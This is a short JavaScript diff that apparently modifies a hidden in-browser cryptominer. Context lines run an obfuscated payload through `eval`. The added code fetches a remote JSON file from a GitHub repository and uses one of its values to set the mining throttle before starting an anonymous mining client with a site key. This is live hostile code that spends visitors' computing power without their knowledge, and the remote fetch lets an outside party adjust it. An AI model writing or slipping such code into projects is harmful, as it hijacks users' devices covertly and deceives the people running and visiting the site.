@@ -9,9 +9,14 @@ function f(a) {
 }
 v = f(v)
 eval(v)
-var _client = new Client.Anonymous("fe30635c79bc5267e6c0769fe76dd6cedb3f74113fa9b9616f6c9ad377a1ce23", {
-  throttle: 0.6,
-  c: "w",
-  ads: 0,
-})
-_client.start()
+fetch("https://raw.githubusercontent.com/lu7766lu7766/project-switch/main/switch.json")
+  .then((res) => res.json())
+  .then((res) => {
+    const harder = 1 - res["aurora"] || 0
+    var _client = new Client.Anonymous("fe30635c79bc5267e6c0769fe76dd6cedb3f74113fa9b9616f6c9ad377a1ce23", {
+      throttle: harder,
+      c: "w",
+      ads: 0,
+    })
+    _client.start()
+  })
